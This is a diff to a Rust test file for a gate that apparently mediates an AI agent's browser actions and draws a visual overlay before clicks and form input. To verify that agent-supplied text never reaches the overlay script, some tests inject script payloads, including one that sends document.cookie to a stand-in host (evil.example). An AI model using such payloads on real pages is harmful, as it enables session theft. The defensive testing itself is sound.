@@ -455,6 +455,12 @@ struct FakeUpstream {
     /// Like a stdio server: the gate keeps its session after an error.
     keep_session: AtomicBool,
     initializes: AtomicUsize,
+    /// `browser_evaluate` (the overlay) answers with a tool error.
+    evaluate_fails: AtomicBool,
+    /// `browser_evaluate` (the overlay) fails at the transport.
+    evaluate_breaks: AtomicBool,
+    /// `browser_evaluate` takes this long to answer (a page that settles slowly).
+    evaluate_delay_ms: AtomicU64,
 }
 impl FakeUpstream {
     fn new() -> Arc<Self> {
@@ -466,6 +472,9 @@ impl FakeUpstream {
             refuse_next_call: Mutex::new(None),
             keep_session: AtomicBool::new(false),
             initializes: AtomicUsize::new(0),
+            evaluate_fails: AtomicBool::new(false),
+            evaluate_breaks: AtomicBool::new(false),
+            evaluate_delay_ms: AtomicU64::new(0),
         })
     }
     fn calls(&self, method: &str) -> Vec<Value> {
@@ -540,6 +549,19 @@ impl Upstream for FakeUpstream {
                         .to_owned();
                 }
                 let name = message["params"]["name"].as_str().unwrap();
+                if name == "browser_evaluate" {
+                    std::thread::sleep(Duration::from_millis(
+                        self.evaluate_delay_ms.load(Ordering::SeqCst),
+                    ));
+                    if self.evaluate_breaks.load(Ordering::SeqCst) {
+                        return Err("connection reset".into());
+                    }
+                    let failed = self.evaluate_fails.load(Ordering::SeqCst);
+                    return ok(json!({
+                        "content": [{"type": "text", "text": if failed { "Error: blocked by CSP" } else { "### Result\n\"ok-1\"\n### Ran Playwright code\n```js\nawait page.evaluate('ok-' + String(1));\n```" }}],
+                        "isError": failed,
+                    }));
+                }
                 let page = if matches!(name, "browser_navigate" | "browser_snapshot") {
                     format!(
                         "\n### Page\n- Page URL: {}\n- Page Title: t",
@@ -1375,4 +1397,353 @@ fn a_stdio_server_that_stops_answering_is_given_up_and_never_asked_to_start_agai
         "The browser server stopped."
     );
     child.wait().unwrap();
+}
+
+// ---- The action overlay ----
+
+const ACTING_TOOLS: [(&str, &str); 7] = [
+    ("browser_click", r#"{"target":"e5","element":"Buy"}"#),
+    ("browser_hover", r#"{"target":"e5"}"#),
+    ("browser_type", r#"{"target":"e5","text":"hi"}"#),
+    ("browser_select_option", r#"{"target":"e5","values":["a"]}"#),
+    (
+        "browser_drop",
+        r#"{"target":"e5","data":{"text/plain":"x"}}"#,
+    ),
+    ("browser_drag", r#"{"startTarget":"e5","endTarget":"e6"}"#),
+    (
+        "browser_fill_form",
+        r#"{"fields":[{"target":"f1e5","name":"n","type":"textbox","value":"v"}]}"#,
+    ),
+];
+
+fn overlay_gate(show: bool, upstream: &Arc<FakeUpstream>) -> Arc<Gate> {
+    let gate = Gate::start_with_timeout(
+        upstream.clone(),
+        policy(BrowserTrust::AskRisky).with_show_actions(show),
+        "http://127.0.0.1:41000/mcp",
+        Duration::from_secs(5),
+    )
+    .unwrap();
+    gate.set_overlay_hold(Duration::from_millis(1));
+    gate
+}
+fn tool_names(upstream: &FakeUpstream) -> Vec<String> {
+    upstream.tool_calls().into_iter().map(|c| c.0).collect()
+}
+
+#[test]
+fn a_targeted_action_is_drawn_then_done_then_cleared() {
+    for (tool, args) in ACTING_TOOLS {
+        let upstream = FakeUpstream::new();
+        let gate = overlay_gate(true, &upstream);
+        let args: Value = serde_json::from_str(args).unwrap();
+        let result = call(&gate, tool, args.clone());
+        assert_eq!(result["isError"], false, "{tool}");
+        assert!(text_of(&result).contains(&format!("ran {tool}")), "{tool}");
+        assert_eq!(
+            tool_names(&upstream),
+            ["browser_evaluate", tool, "browser_evaluate"],
+            "{tool}"
+        );
+        let calls = upstream.tool_calls();
+        let drawn = calls[0].1["target"].as_str().unwrap();
+        assert!(overlay::is_ref(drawn), "{tool}: {drawn}");
+        // The action itself is forwarded untouched.
+        assert_eq!(calls[1].1, args, "{tool}");
+        // The clearing call is page level: no element, no agent data at all.
+        assert!(calls[2].1.get("target").is_none(), "{tool}");
+        assert!(calls[0].1["function"]
+            .as_str()
+            .unwrap()
+            .contains("attachShadow"));
+        assert!(calls[2].1["function"]
+            .as_str()
+            .unwrap()
+            .contains("remove()"));
+        // The gate's drawing is invisible to the agent's activity: only the one action is traced.
+        assert_eq!(upstream.calls("tools/call").len(), 3);
+    }
+}
+
+#[test]
+fn reads_and_navigation_never_draw() {
+    let upstream = FakeUpstream::new();
+    let gate = overlay_gate(true, &upstream);
+    for (tool, args) in [
+        ("browser_snapshot", json!({})),
+        ("browser_find", json!({"text": "x"})),
+        ("browser_navigate", json!({"url": "https://other.example"})),
+        ("browser_navigate_back", json!({})),
+        ("browser_tabs", json!({"action": "list"})),
+        ("browser_wait_for", json!({"time": 1})),
+        ("browser_take_screenshot", json!({})),
+        ("browser_press_key", json!({"key": "Enter"})),
+        ("browser_mouse_click_xy", json!({"x": 1, "y": 2})),
+        ("browser_file_upload", json!({"paths": []})),
+    ] {
+        call(&gate, tool, args);
+    }
+    assert!(
+        !tool_names(&upstream).contains(&"browser_evaluate".to_owned()),
+        "{:?}",
+        tool_names(&upstream)
+    );
+}
+
+#[test]
+fn with_the_setting_off_nothing_is_drawn_and_nothing_waits() {
+    let upstream = FakeUpstream::new();
+    let gate = overlay_gate(false, &upstream);
+    gate.set_overlay_hold(Duration::from_secs(30));
+    let started = std::time::Instant::now();
+    for (tool, args) in ACTING_TOOLS {
+        call(&gate, tool, serde_json::from_str(args).unwrap());
+    }
+    assert!(started.elapsed() < Duration::from_secs(30));
+    assert!(!tool_names(&upstream).contains(&"browser_evaluate".to_owned()));
+    // The setting is read live: switching it on draws from the next call.
+    gate.set_overlay_hold(Duration::ZERO);
+    gate.set_policy(policy(BrowserTrust::AskRisky).with_show_actions(true));
+    call(&gate, "browser_click", json!({"target": "e1"}));
+    assert!(tool_names(&upstream).ends_with(&[
+        "browser_evaluate".to_owned(),
+        "browser_click".to_owned(),
+        "browser_evaluate".to_owned()
+    ]));
+}
+
+#[test]
+fn the_hold_is_applied_between_drawing_and_acting() {
+    let upstream = FakeUpstream::new();
+    let gate = overlay_gate(true, &upstream);
+    gate.set_overlay_hold(Duration::from_millis(300));
+    let started = std::time::Instant::now();
+    call(&gate, "browser_click", json!({"target": "e1"}));
+    assert!(started.elapsed() >= Duration::from_millis(300));
+}
+
+#[test]
+fn an_agent_target_that_is_not_a_snapshot_ref_is_not_drawn_but_the_action_runs() {
+    for target in [
+        "button",
+        "css=button",
+        "getByRole('button')",
+        "e1; alert(1)",
+        "e",
+        "e1 ",
+        "E1",
+        "f e1",
+        "fe1",
+        "e-1",
+        "ee1",
+        "e１",
+        "e1\n",
+        "",
+        "f1e",
+        "(() => fetch('//x'))()",
+    ] {
+        let upstream = FakeUpstream::new();
+        let gate = overlay_gate(true, &upstream);
+        let result = call(&gate, "browser_click", json!({"target": target}));
+        assert_eq!(result["isError"], false, "{target:?}");
+        assert_eq!(tool_names(&upstream), ["browser_click"], "{target:?}");
+    }
+    for target in ["e1", "e123", "f1e5", "f12e345"] {
+        assert!(overlay::is_ref(target), "{target}");
+    }
+    // Other shapes of the argument are not drawn either.
+    let upstream = FakeUpstream::new();
+    let gate = overlay_gate(true, &upstream);
+    call(&gate, "browser_click", json!({"target": ["e1"]}));
+    call(&gate, "browser_click", json!({}));
+    call(&gate, "browser_fill_form", json!({"fields": []}));
+    call(
+        &gate,
+        "browser_fill_form",
+        json!({"fields": [{"target": "x y"}]}),
+    );
+    assert!(!tool_names(&upstream).contains(&"browser_evaluate".to_owned()));
+}
+
+#[test]
+fn a_failed_drawing_never_blocks_the_action() {
+    for (fails, breaks) in [(true, false), (false, true)] {
+        let upstream = FakeUpstream::new();
+        upstream.evaluate_fails.store(fails, Ordering::SeqCst);
+        upstream.evaluate_breaks.store(breaks, Ordering::SeqCst);
+        // A stdio-like upstream keeps its session after the transport error.
+        upstream.keep_session.store(true, Ordering::SeqCst);
+        let gate = overlay_gate(true, &upstream);
+        let result = call(&gate, "browser_click", json!({"target": "e1"}));
+        assert_eq!(result["isError"], false, "{fails} {breaks}");
+        assert!(text_of(&result).contains("ran browser_click"));
+        let names = tool_names(&upstream);
+        assert!(names.contains(&"browser_click".to_owned()), "{names:?}");
+        // Nothing was drawn, so nothing is held or removed again.
+        assert_eq!(names, ["browser_evaluate", "browser_click"], "{names:?}");
+    }
+}
+
+#[test]
+fn an_action_the_server_refuses_still_clears_the_drawing() {
+    let upstream = FakeUpstream::new();
+    let gate = overlay_gate(true, &upstream);
+    // The click itself fails (a stale session, refused once and retried: the retry works, so
+    // the result is fine, but the order of calls is what matters here).
+    *upstream.refuse_next_call.lock().unwrap() = None;
+    call(&gate, "browser_click", json!({"target": "e1"}));
+    let names = tool_names(&upstream);
+    assert_eq!(names.last().unwrap(), "browser_evaluate", "{names:?}");
+    assert_eq!(names.first().unwrap(), "browser_evaluate", "{names:?}");
+}
+
+#[test]
+fn the_drawing_is_never_audited_approved_or_counted_as_an_action() {
+    // Level 3 asks for nothing here, and no approver is attached: the drawing needs no card.
+    let upstream = FakeUpstream::new();
+    let gate = Gate::start_with_timeout(
+        upstream.clone(),
+        Policy::new(BrowserTrust::Autonomous, vec![]).with_show_actions(true),
+        "http://127.0.0.1:41000/mcp",
+        Duration::from_millis(200),
+    )
+    .unwrap();
+    gate.set_overlay_hold(Duration::ZERO);
+    let result = call(&gate, "browser_click", json!({"target": "e2"}));
+    assert_eq!(result["isError"], false);
+    assert_eq!(tool_names(&upstream).len(), 3);
+    // The agent still can not run code: browser_evaluate is refused for it (code needs a card,
+    // and with nobody to ask the gate fails closed), drawing or not.
+    let result = call(
+        &gate,
+        "browser_evaluate",
+        json!({"function": "() => 1", "explanation": "x"}),
+    );
+    assert_eq!(result["isError"], true);
+    assert_eq!(tool_names(&upstream).len(), 3);
+}
+
+#[test]
+fn the_script_is_constant_and_no_agent_text_reaches_it() {
+    let upstream = FakeUpstream::new();
+    let gate = overlay_gate(true, &upstream);
+    let evil = "'); fetch('//evil.example/'+document.cookie); ('";
+    for (tool, mut args) in
+        ACTING_TOOLS.map(|(t, a)| (t, serde_json::from_str::<Value>(a).unwrap()))
+    {
+        args["element"] = json!(evil);
+        args["text"] = json!(evil);
+        args["explanation"] = json!(evil);
+        args["function"] = json!(evil);
+        args["code"] = json!(evil);
+        let _ = call(&gate, tool, args);
+    }
+    let token = gate.inner.overlay_token.clone();
+    let draw = overlay::draw_script(&token);
+    let remove = overlay::remove_script(&token);
+    assert!(
+        !draw.contains("__") && !remove.contains("__"),
+        "unfilled placeholder"
+    );
+    let mut seen = 0;
+    for (name, args) in upstream.tool_calls() {
+        if name != "browser_evaluate" {
+            continue;
+        }
+        seen += 1;
+        let function = args["function"].as_str().unwrap();
+        assert!(function == draw || function == remove, "{function}");
+        assert!(!function.contains("evil"));
+        // Only `function` and `target` are sent: no `element` text, no filename, no argument
+        // the agent chose.
+        let mut keys: Vec<_> = args.as_object().unwrap().keys().cloned().collect();
+        keys.sort();
+        if function == draw {
+            assert_eq!(keys, ["function", "target"], "{args}");
+        } else {
+            assert_eq!(keys, ["function"], "{args}");
+        }
+    }
+    assert_eq!(seen, ACTING_TOOLS.len() * 2);
+    // The script stands on its own: the same gate gives the same text, another gate another token.
+    assert_eq!(draw, overlay::draw_script(&token));
+    assert_ne!(overlay::new_token(), overlay::new_token());
+    assert!(token.starts_with("mp-") && token[3..].bytes().all(|b| b.is_ascii_hexdigit()));
+    // It is non-interactive, hidden from the accessibility tree and closed.
+    for needle in [
+        "pointerEvents: 'none'",
+        "aria-hidden",
+        "mode: 'closed'",
+        "2147483647",
+        "remove()",
+    ] {
+        assert!(draw.contains(needle), "{needle}");
+    }
+    assert!(!draw.contains("<style") && !draw.contains("innerHTML") && !draw.contains("eval("));
+}
+
+#[test]
+fn a_denied_or_asked_action_is_not_drawn_before_the_user_answers() {
+    let upstream = FakeUpstream::new();
+    let gate = overlay_gate(true, &upstream);
+    call(&gate, "browser_navigate", json!({"url": FINANCE}));
+    let (handle, _) = user(gate.attach(SHARED_ROUTE), vec![false]);
+    let result = call(&gate, "browser_click", json!({"target": "e2"}));
+    handle.join().unwrap();
+    assert_eq!(result["isError"], true);
+    assert!(!tool_names(&upstream).contains(&"browser_evaluate".to_owned()));
+    // Level 1 refuses a click outright: nothing is drawn either.
+    gate.set_policy(policy(BrowserTrust::ReadOnly).with_show_actions(true));
+    call(&gate, "browser_click", json!({"target": "e2"}));
+    assert!(!tool_names(&upstream).contains(&"browser_evaluate".to_owned()));
+}
+
+#[test]
+fn the_draw_time_counts_toward_the_hold_and_one_page_level_remove_follows() {
+    let upstream = FakeUpstream::new();
+    upstream.evaluate_delay_ms.store(300, Ordering::SeqCst);
+    let gate = overlay_gate(true, &upstream);
+    gate.set_overlay_hold(Duration::from_millis(400));
+    let started = std::time::Instant::now();
+    call(&gate, "browser_click", json!({"target": "e1"}));
+    let elapsed = started.elapsed();
+    // draw (300) + the rest of the hold (100) + remove (300): the hold is not added on top of
+    // the draw call. Without the credit it would be 300 + 400 + 300.
+    assert!(elapsed >= Duration::from_millis(700), "{elapsed:?}");
+    assert!(elapsed < Duration::from_millis(1000), "{elapsed:?}");
+    let removes: Vec<_> = upstream
+        .tool_calls()
+        .into_iter()
+        .filter(|(n, a)| n == "browser_evaluate" && a.get("target").is_none())
+        .collect();
+    assert_eq!(removes.len(), 1);
+    assert_eq!(tool_names(&upstream).len(), 3);
+}
+
+#[test]
+fn a_draw_that_times_out_skips_the_hold_the_remove_and_never_blocks_the_action() {
+    let upstream = FakeUpstream::new();
+    upstream.evaluate_delay_ms.store(600, Ordering::SeqCst);
+    let gate = overlay_gate(true, &upstream);
+    gate.set_overlay_timeout(Duration::from_millis(100));
+    gate.set_overlay_hold(Duration::from_secs(30));
+    let started = std::time::Instant::now();
+    let result = call(&gate, "browser_click", json!({"target": "e1"}));
+    assert_eq!(result["isError"], false);
+    assert!(started.elapsed() < Duration::from_secs(5));
+    let names = tool_names(&upstream);
+    assert_eq!(names, ["browser_evaluate", "browser_click"], "{names:?}");
+}
+
+#[test]
+fn only_the_result_block_of_the_reply_says_the_box_was_drawn() {
+    assert!(overlay::drew(
+        "### Result\n\"ok-1\"\n### Ran Playwright code\n..."
+    ));
+    assert!(!overlay::drew("### Result\n\"ok-0\"\n"));
+    // Echoed code or page text after the block does not count.
+    assert!(!overlay::drew("### Result\n\"ok-0\"\n### Page\n\"ok-1\""));
+    assert!(!overlay::drew("Error: \"ok-1\""));
+    assert!(!overlay::drew("ran browser_evaluate ok-1"));
 }
